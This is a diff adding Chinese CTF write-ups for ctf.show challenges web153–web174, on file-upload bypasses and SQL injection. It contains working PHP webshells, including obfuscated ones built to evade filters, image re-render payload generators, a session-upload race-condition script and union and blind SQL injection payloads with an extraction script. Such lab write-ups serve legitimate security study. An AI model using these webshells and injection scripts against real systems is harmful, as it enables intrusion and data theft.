@@ -2392,6 +2392,816 @@
 
 
 
+### web153
+
+1. 上题一样，修改为png后缀，抓包绕过js校验，修改后缀名发现可以使用`php3 php5 phphtml`特殊后缀名，但是中间件是`nginx`，这里要使用`.user.ini`文件来进行构造，具体原理看参考文章，与`.htaccess`类似
+
+   > php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，通常用这个文件来构造后门和隐藏后门。
+
+2. 先来看下怎么构造`.user.ini`，这两个选项就类似文件包含，只要当前目录下有`.php`文件，默认会把包含的文件插入到`.php`文件头/文件尾上，当文件尾后面有`exit`时，会停止程序
+
+   ```shell
+   auto_prepend_file = <filename>         //包含在文件头
+   auto_append_file = <filename>          //包含在文件尾
+   ```
+
+3. 因为可以利用文件包含，这里我们先上传一个图片马
+
+   ![](img/image-20210716133035233.png)
+
+4. 访问下`/upload`目录下，发现刚好有个`index.php`，不用自己上传了
+
+5. 上传`.user.ini`目录配置文件，为了避免出错，把包含`ma.png`添加到文件头位置
+
+   ![](img/image-20210716133549520.png)
+
+6. 访问`/upload/index.php`，利用工具rec即可
+
+   ![](img/image-20210716133951371.png)
+
+
+
+参考文章:
+
+[.htaccess和.user.ini配置文件妙用](https://www.dazhuanlan.com/2020/03/08/5e641cbc397c2/)
+
+
+
+### web154
+
+1. 上传图片马时发现对文件内容做了过滤，会显示文件内容不合规
+
+   ![](img/image-20210720132150300.png)
+
+2. Fuzz测试下他对哪个字符会进行过滤
+
+   ```shell
+   < 正常
+   <? 正常
+   <?php 失败
+   php 正常
+   <?Php 正常
+   ```
+
+3. 发现是`<?php`进行了过滤，利用刚刚的大小写进行绕过
+
+   ![](img/image-20210720132623754.png)
+
+4. 因为上传的是`png`没有被解析，利用上一题上传的`.user.ini`文件进行配合解析
+
+   ![](img/image-20210720132829719.png)
+
+5. 因为`/upload`目录下正好有个`index.php`，这样把包含的文件插入到`index.php`文件头/文件尾上，访问利用工具提交即可
+
+   ![](img/image-20210720133151700.png)
+
+   
+
+### web155
+
+1. 在上题的基础上，检查图片内容，过滤了`php`字符，大小写也过滤了
+
+   ![](img/image-20210720134418909.png)
+
+2. 可以利用php短标签进行绕过
+
+   ```php
+   <? echo '123';?>
+   #开启配置参数short_open_tags=on
+   
+   <?=(表达式)?> == <?php echo (表达式)?>
+   #不需要开启参数设置
+   
+   <% echo '123';%>
+   #开启配置参数asp_tags=on，但是7.0以下版本可以使用
+     
+   <script language=”php”>echo '123'; </script>
+   #php7.0版本以下可以使用
+   ```
+
+3. 这里利用第二种方法进行绕过
+
+   ![](img/image-20210720135228070.png)
+
+4. 再进行上传`.user.ini`配置文件，这里不多解释了，访问进行配合解析，利用工具连接REC即可
+
+   ![](img/image-20210720135354978.png)
+
+
+
+### web156
+
+1. 在前面基础上还过滤了`[`
+
+   ![](img/image-20210720140359982.png)
+
+2. 但是可以利用直接代码执行，或者用`{}`进行绕过
+
+   ```shell
+   <?= system('tac ../fla*');?>
+   
+   <?= eval($_POST{cmd});?>
+   ```
+
+   ![](img/image-20210720141008582.png)
+
+3. 配合上传`.user.ini`进行解析，利用工具rec
+
+   ![](img/image-20210720141124629.png)
+
+
+
+### web157
+
+1. 在上面的基础上，还过滤了`;` `{}`
+
+2. 分号在一条语句的情况下，可以利用`?>`结尾结束代替进行绕过，`{}`过滤了，就不能传参数了，直接代码执行吧
+
+   ```php
+   <?= system("tac ../fl*")?>
+   ```
+
+   ![](img/image-20210720142448149.png)
+
+3. 配合上传`.user.ini`，访问即可
+
+   ![](img/image-20210720142527534.png)
+
+
+
+### web158
+
+与`web157`相同，可参考
+
+
+
+### web159
+
+1. 在上面基础上，过滤了`()`
+
+2. 利用反引号，达到命令执行效果
+
+   ```php
+   <?= `tac ../fl*`?>
+   ```
+
+   ![](img/image-20210720154516534.png)
+
+3. 配合`.user.ini`进行解析，访问页面
+
+   ![](img/image-20210720154606404.png)
+
+
+
+### web160
+
+1. 在上题的基础上把反撇号，空格给过滤了，那么基本上无法执行命令了
+
+2. 利用文件`nginx`日志进行文件包含，`nginx`日志路径`/var/log/nginx/access.log`
+
+3. 抓包发送时，发现`log`也被过滤了
+
+   ![](img/image-20210720163017437.png)
+
+4. 利用拼接进行绕过
+
+   ![](img/image-20210720163117294.png)
+
+5. 上传`.user.ini`配合解析，注意空格
+
+   ![](img/image-20210720163226428.png)
+
+6. 改写`UA`头，访问页面执行php命令
+
+   ![](img/image-20210720165959676.png)
+
+
+
+### web161
+
+1. 在前面的步骤上，添加了对图片信息检测，这里我把源码拉下来了
+
+   ```php
+   <?php
+   error_reporting(0);
+   if ($_FILES["file"]["error"] > 0)
+   {
+   	$ret = array("code"=>2,"msg"=>$_FILES["file"]["error"]);
+   }
+   else
+   {
+       $filename = $_FILES["file"]["name"];
+       $filesize = ($_FILES["file"]["size"] / 1024);
+       if($filesize>1024){
+       	$ret = array("code"=>1,"msg"=>"文件超过1024KB");
+       }else{
+       	if($_FILES['file']['type'] == 'image/png'){
+               $arr = pathinfo($filename);
+               $ext_suffix = $arr['extension'];
+           //检测文件后缀名是不是php
+               if($ext_suffix!='php'){
+                 //检查上传文件内容
+                   $content = file_get_contents($_FILES["file"]["tmp_name"]);
+                   if(stripos($content, "php")===FALSE && check($content) && getimagesize($_FILES["file"]["tmp_name"]))
+                     //检查图片头
+                   {
+                       move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$_FILES["file"]["name"]);
+                       $ret = array("code"=>0,"msg"=>"upload/".$_FILES["file"]["name"]);
+                   }else{
+                       $ret = array("code"=>2,"msg"=>"文件类型不合规");
+                   }
+                   
+               }else{
+                   $ret = array("code"=>2,"msg"=>"文件类型不合规");
+               }
+       		
+       	}else{
+       		$ret = array("code"=>2,"msg"=>"文件类型不合规");
+       	}
+       	
+       }
+   
+   }
+   function check($str){
+       return !preg_match('/php|\{|\[|\;|log|\(| |\`/i', $str);
+   }
+   echo json_encode($ret);
+   ```
+
+2. 添加图片文件头然后后续步骤与`web160`相似，日志文件包含
+
+   ![](img/image-20210721102228623.png)
+
+3. 上传`.user.ini`
+
+   ![](img/image-20210721102259759.png)
+
+4. 改写`UA`头，写shell，命令执行即可
+
+   ![](img/image-20210721102343446.png)
+
+
+
+### web162/163(session文件包含)
+
+1. 这里在上面的基础上还过滤了`.` `flag`  ，导致无法使用`nginx`日志文件了，这里用会话文件进行包含，利用`PHP_SESSION_UPLOAD_PROGRESS`上传进度来实现，具体原理不再阐述了，请参看[文件包含-web82](https://www.yuque.com/seals6/szn0t2/scsu3b)
+
+2. 这里先讲讲如何用手工去做，先构造一个上传表单，抓包上传文件，添加我们的自定义`sessionid`，构造我们的命令
+
+   ```html
+   <!DOCTYPE html>
+   <html lang="en">
+   <head>
+       <meta charset="UTF-8">
+       <title>session upload</title>
+   </head>
+   <body>
+   <form action="http://ef9b7985-b104-4bbc-94c4-596133d834f1.challenge.ctf.show:8080/" method="POST" enctype="multipart/form-data">
+     <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
+     <input type="file" name="file1" />
+     <input type="submit" />
+   </form>
+   </body>
+   </html>
+   ```
+
+   ![](img/image-20210721110122097.png)
+
+3. 上传我们的`ma.png`，发现`.`  `flag`被过滤了，修改成包含我们自定义的`/tmp/sess_fl`目录下的会话文件，同时把上传文件名也修改成没有后缀名，这样在`.user.ini`中就不会再过滤
+
+   ![](img/image-20210721110334887.png)
+
+4. 上传`.user.ini`
+
+   ![](img/image-20210721110359104.png)
+
+5. 因为`PHP_SESSION_UPLOAD_PROGRESS`上传完成后，会清空session中的内容，所以要利用条件竞争，不断上传，不断访问，利用`burp`intruder模块进行竞争
+
+   ![](img/image-20210721110620408.png)
+
+6. 下面附上`python`脚本
+
+   ```python
+   # -*- coding: utf-8 -*-
+   '''
+   PS:前提先完成上传.user.ini和ma的前两个步骤，脚本只是完成上传upload_progress，和条件竞争
+   '''
+   import requests
+   import io
+   import threading
+   
+   url1="http://84a97d83-62d6-422b-a3db-5c74be7d7b8a.challenge.ctf.show:8080/"
+   url2=url1+"upload/index.php"
+   sess="fl"
+   data={"abc":"system('tac ../f*');"}
+   
+   def write(session):
+       while True:
+           f = io.BytesIO(b'a' * 1024 * 50)
+           r1=session.post(url=url1,
+                            data={"PHP_SESSION_UPLOAD_PROGRESS":'123<?php eval($_POST["abc"]);?>'},
+                            cookies={"PHPSESSID":sess},
+                            files={'file': ('1.txt', f)})
+   
+   def read(session):
+       while True:
+           resp = session.post(url2,data=data)
+           if '1.txt' in resp.text:
+               print(resp.text)
+               event.clear()
+           else:
+               # print("retry")
+               pass
+   
+   if __name__ == "__main__":
+       event = threading.Event()
+       with requests.session() as session:
+           for i in range(0,30):
+               threading.Thread(target=write, args=(session,)).start()
+   
+           for i in range(0,30):
+               threading.Thread(target=read, args=(session,)).start()
+       event.set()
+   ```
+
+### web164(PNG二次渲染)
+
+1. 这里题目提示改头换面，看了下源码，发现有个`<a href='download.php?image=`好像是文件包含的链接
+
+2. 上传图片发现，只能上传`png`，上传成功后，把图片下载下来后发现大小不一样，应该是被二次渲染了
+
+3. 这里利用`png二次渲染的脚本`生成png图片，进行上传
+
+   ```php
+   <?php
+   
+   /*<?$_GET[0]($_POST[1]);?>*/
+   
+   $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+       0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+       0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+       0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+       0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+       0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+       0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+       0x66, 0x44, 0x50, 0x33);
+   
+   
+   
+   $img = imagecreatetruecolor(32, 32);
+   
+   for ($y = 0; $y < sizeof($p); $y += 3) {
+       $r = $p[$y];
+       $g = $p[$y+1];
+       $b = $p[$y+2];
+       $color = imagecolorallocate($img, $r, $g, $b);
+       imagesetpixel($img, round($y / 3), 0, $color);
+   }
+   
+   imagepng($img,'1.png');
+   
+   ```
+
+4. 成功后点击访问拖页面，抓包提交参数达到命令执行
+
+   ![](img/image-20210721135103000.png)
+
+
+
+### web165(JPG二次渲染绕过)
+
+1. 与上题一样，但是是jpg图片二次渲染，这里有很多玄学的问题，参考了多个师傅的文章，放在了本文末尾
+
+2. 因为自己选的jpg图片就没成功，很玄学，最后使用了国光师傅的jpg文件和教程，这里贴出来
+
+   ![1](img/1.jpg)
+
+3. 先将本图片进行上传，让服务器端进行二次渲染，把渲染之后的图片重新下载下来，保存为`download.php.jpg`图片，当然你也可以命名为其他的，为什么要先上传渲染一遍，因为玄学...
+
+4. 这里附上jpg二次渲染绕过的脚本
+
+   ```php
+   <?php
+   	$miniPayload = '<?=eval($_POST[1]);?>';
+   
+   
+   	if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
+       	die('php-gd is not installed');
+   	}
+   
+   	if(!isset($argv[1])) {
+   		die('php jpg_payload.php <jpg_name.jpg>');
+   	}
+   
+   	set_error_handler("custom_error_handler");
+   
+   	for($pad = 0; $pad < 1024; $pad++) {
+   		$nullbytePayloadSize = $pad;
+   		$dis = new DataInputStream($argv[1]);
+   		$outStream = file_get_contents($argv[1]);
+   		$extraBytes = 0;
+   		$correctImage = TRUE;
+   
+   		if($dis->readShort() != 0xFFD8) {
+   			die('Incorrect SOI marker');
+   		}
+   
+   		while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
+   			$marker = $dis->readByte();
+   			$size = $dis->readShort() - 2;
+   			$dis->skip($size);
+   			if($marker === 0xDA) {
+   				$startPos = $dis->seek();
+   				$outStreamTmp =
+   					substr($outStream, 0, $startPos) .
+   					$miniPayload .
+   					str_repeat("\0",$nullbytePayloadSize) .
+   					substr($outStream, $startPos);
+   				checkImage('_'.$argv[1], $outStreamTmp, TRUE);
+   				if($extraBytes !== 0) {
+   					while((!$dis->eof())) {
+   						if($dis->readByte() === 0xFF) {
+   							if($dis->readByte !== 0x00) {
+   								break;
+   							}
+   						}
+   					}
+   					$stopPos = $dis->seek() - 2;
+   					$imageStreamSize = $stopPos - $startPos;
+   					$outStream =
+   						substr($outStream, 0, $startPos) .
+   						$miniPayload .
+   						substr(
+   							str_repeat("\0",$nullbytePayloadSize).
+   								substr($outStream, $startPos, $imageStreamSize),
+   							0,
+   							$nullbytePayloadSize+$imageStreamSize-$extraBytes) .
+   								substr($outStream, $stopPos);
+   				} elseif($correctImage) {
+   					$outStream = $outStreamTmp;
+   				} else {
+   					break;
+   				}
+   				if(checkImage('payload_'.$argv[1], $outStream)) {
+   					die('Success!');
+   				} else {
+   					break;
+   				}
+   			}
+   		}
+   	}
+   	unlink('payload_'.$argv[1]);
+   	die('Something\'s wrong');
+   
+   	function checkImage($filename, $data, $unlink = FALSE) {
+   		global $correctImage;
+   		file_put_contents($filename, $data);
+   		$correctImage = TRUE;
+   		imagecreatefromjpeg($filename);
+   		if($unlink)
+   			unlink($filename);
+   		return $correctImage;
+   	}
+   
+   	function custom_error_handler($errno, $errstr, $errfile, $errline) {
+   		global $extraBytes, $correctImage;
+   		$correctImage = FALSE;
+   		if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
+   			if(isset($m[1])) {
+   				$extraBytes = (int)$m[1];
+   			}
+   		}
+   	}
+   
+   	class DataInputStream {
+   		private $binData;
+   		private $order;
+   		private $size;
+   
+   		public function __construct($filename, $order = false, $fromString = false) {
+   			$this->binData = '';
+   			$this->order = $order;
+   			if(!$fromString) {
+   				if(!file_exists($filename) || !is_file($filename))
+   					die('File not exists ['.$filename.']');
+   				$this->binData = file_get_contents($filename);
+   			} else {
+   				$this->binData = $filename;
+   			}
+   			$this->size = strlen($this->binData);
+   		}
+   
+   		public function seek() {
+   			return ($this->size - strlen($this->binData));
+   		}
+   
+   		public function skip($skip) {
+   			$this->binData = substr($this->binData, $skip);
+   		}
+   
+   		public function readByte() {
+   			if($this->eof()) {
+   				die('End Of File');
+   			}
+   			$byte = substr($this->binData, 0, 1);
+   			$this->binData = substr($this->binData, 1);
+   			return ord($byte);
+   		}
+   
+   		public function readShort() {
+   			if(strlen($this->binData) < 2) {
+   				die('End Of File');
+   			}
+   			$short = substr($this->binData, 0, 2);
+   			$this->binData = substr($this->binData, 2);
+   			if($this->order) {
+   				$short = (ord($short[1]) << 8) + ord($short[0]);
+   			} else {
+   				$short = (ord($short[0]) << 8) + ord($short[1]);
+   			}
+   			return $short;
+   		}
+   
+   		public function eof() {
+   			return !$this->binData||(strlen($this->binData) === 0);
+   		}
+   	}
+   ?>
+   ```
+
+5. `payload`可以自己更改，将服务器下载好的图片与php脚本放在一起，利用命令行，生成payload图片
+
+   ```shell
+   php jpg_payload.php download.php.jpg
+   ```
+
+6. 然后进行上传图片，访问文件包含图片地址，抓包，post数据，命令执行
+
+   ![](img/image-20210721150545885.png)
+
+
+
+参考文章：
+
+[国光-国光的文件上传靶场知识总结](https://www.sqlsec.com/2020/10/upload.html#toc-heading-17)
+
+[南方师傅-web165](https://www.wlhhlc.top/posts/14827/)
+
+[二次渲染绕过](https://www.fujieace.com/penetration-test/upload-labs-pass-16.html)
+
+
+
+### web166(前端绕过)
+
+1. 发现前端只能上传zip文件，但返回地址是个文件包含漏洞
+
+2. 将一句话木马改为zip文件，进行上传，注意`Content-Type`为`application/x-zip-compressed`
+
+   ![](img/image-20210721155239728.png)
+
+3. 利用工具连接返回地址，rce即可
+
+   ![](img/image-20210721160150198.png)
+
+
+
+### web167(.htaccess绕过)
+
+1. 抓包上传发现只能上传`jpg`文件，在测试`upload`目录是否还有php文件时，发现报错`apache`服务
+
+   ![](img/image-20210721161350245.png)
+
+2. 利用`.htaccess`文件进行解析图片，原理与`.user.ini`类似，抓包上传
+
+   ![](img/image-20210721161505123.png)
+
+3. 访问我的图片马，执行命令
+
+   ![](img/image-20210721161540822.png)
+
+
+
+### web168(基础免杀)
+
+1. 可以直接抓包上传php，但是`system` `eval`被过滤了
+
+2. 下面是收集的几个免杀脚本
+
+   ```php
+   #利用反引号执行系统命令
+   <?=`$_REQUEST[1]`;?>
+   ```
+
+   ```php
+   #利用传参数
+   <?php
+   $a=$_REQUEST['a'];
+   $b=$_REQUEST['b'];
+   $a($b);
+   ?>
+   ```
+
+   ```php
+   #利用拼接
+   <?php $a='syste'.'m';
+   ($a)('ls ../');
+   ?>
+   ```
+
+   ```PHP
+   #拼接
+   <?php
+   $a = "s#y#s#t#e#m";
+   $b = explode("#",$a);
+   $c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
+   $c($_REQUEST[1]);
+   ?>
+   ```
+
+   ```php
+   #拼接
+   <?php
+   $a=substr('1s',1).'ystem';
+   $a($_REQUEST[1]);
+   ?>
+   ```
+
+   ```php
+   #利用反转字符
+   <?php
+   $a=strrev('metsys');
+   $a($_REQUEST[1]);
+   ?>
+   ```
+
+   ```php
+   #利用数学函数
+   <?php
+   $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi{abs})($$pi{acos});
+   # get传参   abs=system&acos=ls
+   ```
+
+3. 这里我直接利用第四个进行绕过，上传，执行命令
+
+   ![](img/image-20210721163901974.png)
+
+4. 传参数，执行rce
+
+   ![](img/image-20210721163952890.png)
+
+
+
+### web169/170(.user.ini日志包含)
+
+1. 抓包，发现前端只能上传`zip`文件，这里把木马改为`ma.zip`
+
+2. 发包发现，还是不能上传，这里修改`Content-Type`为`image/png`可以上传php，但是过滤了`<` `php`，所以php代码肯定用不了，利用日志文件包含
+
+3. 上传`.user.ini`将nginx日志包含到当前目录任意php文件上
+
+   ![](img/image-20210721174000831.png)
+
+4. 上传个随意php文件，改写`UA头`，写shell
+
+   ![](img/image-20210721174110121.png)
+
+5. 访问网页，利用工具提交参数即可
+
+   ![](img/image-20210721174644058.png)
+
+
+
+## 7.sql注入
+
+### web171(联合查询)
+
+1. 没有过滤最基础的联合查询爆数据，这里只写payload了
+
+   ```shell
+   #判断回显位
+   -1' union select 1,2,3--+
+   
+   #爆表
+   -1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()--+
+   
+   #爆列
+   -1'  union select group_concat(column_name),2,3 from information_schema.columns where table_name='ctfshow_user'--+
+   
+   #爆数据
+   -1'  union select id,username,password from ctfshow_user--+
+   ```
+
+
+
+### web172(联合查询)
+
+1. 还是一样的基础注入，只放payload了
+
+   ```shell
+   #这次只有两个列了
+   1' order by 2--+
+   
+   #判断回显位
+   -1' union select 1,2--+
+   
+   #爆表，这次多了个表
+   -1' union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--+
+   
+   #应该是第二个表里，才有flag,爆列
+   -1' union select group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name='ctfshow_user2'--+
+   
+   #爆数据，因为会检查username值是否有flag,有的话，flag就不会显示出来，所以直接把username置为1
+   -1' union select 1,password from ctfshow_user2--+
+   ```
+
+
+
+### web173(联合查询+过滤)
+
+1. 这里返回逻辑对`flag`进行了过滤，所以要将返回值进行编码下，下面放payload，具体步骤都是类似的
+
+   ```shell
+   #又恢复成3列了，判断回显
+   -1' union select 1,2,3 --+
+   
+   #爆表
+   -1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database() --+
+   
+   #爆列，经验告诉我肯定在第三张表
+   -1' union select group_concat(column_name),2,3 from information_schema.columns where table_schema=database() and table_name='ctfshow_user3'--+
+   
+   #爆数据，编码下绕过过滤
+   -1' union select id,to_base64(username),to_base64(password) from ctfshow_user3--+
+   -1' union select id,hex(username),hex(password) from ctfshow_user3--+
+   ```
+
+
+
+
+### web174(布尔盲注+过滤)
+
+1. 这里返回逻辑把`flag`数字都过滤了，那么编码的方法肯定不能用了，利用布尔盲注吧，先简单测一下
+
+   ```shell
+   #看看有几列
+   1' order by 2--+
+   
+   #看看回显位，因为过滤了数字，肯定不能用数字进行回显了
+   -1' union select 'a','b'--+
+   
+   #爆数据库名字
+   -1' union select database(),'b'--+
+   
+   #根据经验，表肯定是ctfshow_user4,这里因为有数字，肯定会被过滤，构造布尔盲注测试一下
+   -1' union select if(ascii(substr((select database()),0,1))>97,'yes','no'),'b'--+
+   ```
+
+2. 这里写个脚本来跑
+
+   ```python
+   # -*- coding: utf-8 -*-
+   '''
+   @Time : 2021/7/23 11:07
+   @Author : Seals6
+   @File : web164.py
+   @contact: 972480239@qq.com
+   @blog: seals6.github.io
+   
+   -*- 功能说明 -*-
+   
+   -*- 更新说明 -*-
+   
+   '''
+   import requests
+   url="http://5272c169-2883-4fca-8822-f7dd6daa672f.challenge.ctf.show:8080/api/v4.php"
+   i=0
+   flag=""
+   
+   while True:
+       i+=1
+       max=128
+       min=30
+   
+       while min<max:
+           mid = (max + min) // 2
+           payload="-1' union select 'a',if(ascii(substr((select group_concat(password) from ctfshow_user4 where username='flag'),%d,1))>%d,'yes','no') -- "%(i,mid)
+           params = {"id": payload}
+           r=requests.get(url=url,params=params)
+           # print(r.url)
+           if "yes" in r.text:
+               # print(r.text)
+               min=mid+1
+           else:
+               max=mid
+       if min != 30:
+           flag+=chr(min)
+       else:
+           break
+       print(flag)
+   ```
+
+   
+
 ## 8.php反序列化
 
 ### web254
